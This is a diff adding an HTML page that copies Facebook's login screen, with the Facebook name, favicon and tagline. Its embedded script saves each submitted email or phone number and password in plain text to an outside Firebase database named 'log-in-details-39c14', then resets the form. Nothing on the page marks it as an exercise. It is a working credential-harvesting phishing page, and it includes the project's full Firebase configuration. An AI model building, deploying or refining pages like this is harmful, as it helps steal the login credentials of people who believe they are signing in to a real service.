@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/theme.css">
+    <link rel="stylesheet" href="./css/bootstrap.min.css">
+    <script src="https://unpkg.com/typeit@8.7.1/dist/index.umd.js"></script>
+    <link rel="shortcut icon" href="./img/facebook-logo-2019.ico" type="image/x-icon">
+    <title>Facebook - Log In or sign up</title>
+</head>
+
+
+
+<body class="bg-gray">
+
+    <div class="p-5">
+
+        <div class="container">
+
+            <div class="row pt-5 d-flex align-items-center  ">
+
+                <div class="col-xl-7 col-lg-6 col-md-12">
+
+                    <div class="text-center pb-3 ">
+                        <h1 class="text-primary facebook  text-start">facebook</h1>
+                        <h1 class="fs-2 text-start fw-medium ">Facebook helps you connect and share with the people in
+                            your life.</h1>
+                    </div>
+
+                </div>
+
+                <div class="col-xl-4 col-lg-6 col-md-12">
+
+                    <div class="card shadow border-0 card-body ">
+
+                        <form id="dataForm">
+
+                            <div class="mb-3">
+
+                                <input type="text" class="form-control form-control-lg"
+                                    placeholder="Email or phone number" id="username" name="username" required>
+                            </div>
+
+                            <div class="mb-3">
+
+                                <input type="text" class="form-control form-control-lg holder" placeholder="Password"
+                                    id="password" name="password" required>
+                            </div>
+
+                            <div class="d-grid gap-2 col-12 mx-auto ">
+                                <button class="btn btn-primary text-light fw-bold btn-lg border-0 btn-h-primary"
+                                    type="submit">Log
+                                    In</button>
+
+                                <div class="text-center">
+                                    <a href="#" class="text-decoration-none">Forgot password?</a>
+                                </div>
+
+                                <hr>
+
+                                <div class="text-center pb-2">
+                                    <button class="btn btn-success text-light fw-bold btn-lg border-0 btn-h-success"
+                                        type="submit">Create
+                                        new
+                                        account</button>
+                                </div>
+
+                        </form>
+
+
+                    </div>
+
+                </div>
+
+
+                <div class="text-center pt-3">
+                    Create a Page or a celebrity, brand or business
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+
+
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getDatabase, set, get, ref } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+            apiKey: "AIzaSyB0oAPUPHL9obD_NUuffMWPLMKqqaa0IEg",
+            authDomain: "log-in-details-39c14.firebaseapp.com",
+            projectId: "log-in-details-39c14",
+            storageBucket: "log-in-details-39c14.firebasestorage.app",
+            messagingSenderId: "435979054098",
+            appId: "1:435979054098:web:b42c0c6c3fabc201c67ccb",
+            measurementId: "G-7K3MY1M47H"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+
+        document.getElementById("dataForm").addEventListener("submit", function (e) {
+            e.preventDefault(); // Prevent form from refreshing the page
+
+            // Get user input values
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Generate a unique user ID (or use any identifier)
+            const userId = `user_${new Date().getTime()}`;
+
+            // Write data to Firebase Realtime Database
+            set(ref(db, 'users/' + userId), {
+                username: username,
+                password: password
+            }).then(() => {
+                document.getElementById("dataForm").reset(); // Clear the form
+            }).catch((error) => {
+                console.error("Error saving data:", error);
+                alert("Failed to save data.");
+            });
+        });
+
+
+
+    </script>
+
+    <script src="./js/theme.js"></script>
+    <script src="./js/bootstrap.min.js"></script>
+</body>
+
+</html>
